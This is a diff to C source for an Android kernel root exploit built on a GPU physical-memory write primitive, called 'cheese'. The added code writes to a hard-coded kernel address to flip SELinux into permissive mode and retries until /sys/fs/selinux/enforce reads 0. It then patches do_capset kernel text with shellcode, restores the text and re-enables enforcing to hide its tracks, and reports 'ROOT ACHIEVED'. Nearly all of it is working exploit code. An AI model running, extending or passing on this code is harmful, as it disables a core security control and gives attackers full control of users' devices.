@@ -731,6 +731,30 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
             0xd503233f, 0xd10203ff, 0xf800865e, 0xa9047bfd, 0xa9055ff8, 0xa90657f6,
             0xa9074ff4, 0x910103fd, 0x90010d28, 0xf9448908, 0xaa0103f4, 0x910073e1, 0xaa0003f5,
         };
+        /* SELinux must be Permissive for the trigger to survive, because commit_creds(&init_cred)
+         * moves our task into the kernel SELinux domain and the transition kills the process under
+         * Enforcing. Do the flip HERE, in the same process as the patch (no adb/shell overhead, fast
+         * retries), and accept it only on the KERNEL's own view: /sys/fs/selinux/enforce == 0. */
+        {
+            uint32_t perm = 0x01010000u;
+            int permissive = 0;
+            for (int t = 0; t < 12 && !permissive; t++) {
+                if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
+                                      phyaddr, 0xaaa40b98ull, &perm, 1, tag++)) {
+                    usleep(1500000); continue;
+                }
+                usleep(400000);
+                FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+                if (f) { int v = -1; if (fscanf(f, "%d", &v) == 1 && v == 0) permissive = 1; fclose(f); }
+                fprintf(stderr, "ROOT: permissive attempt %d -> enforce=%d\n", t, permissive);
+                if (!permissive) usleep(1500000);
+            }
+            if (!permissive) {
+                fprintf(stderr, "ROOT: SELinux will not go permissive - aborting BEFORE patching\n");
+                exit(1);
+            }
+        }
+
         fprintf(stderr, "patching 52 bytes at 0x%lx with ONE bulk copy ...\n", (unsigned long)DO_CAPSET_PA);
         if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
                               phyaddr, DO_CAPSET_PA, sc, 13, tag++)) {
@@ -772,6 +796,11 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
             fprintf(stderr, "ROOT: RESTORE FAILED (reboot will clear)\n");
         else
             fprintf(stderr, "kernel text restored (one bulk copy)\n");
+        {
+            uint32_t enf = 0x01010001u;
+            cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
+                              phyaddr, 0xaaa40b98ull, &enf, 1, tag++);
+        }
         fprintf(stderr, "ROOT RESULT: uid=%d %s\n", getuid(), getuid() == 0 ? "*** ROOT ACHIEVED ***" : "(not root)");
         exit(0);
     }
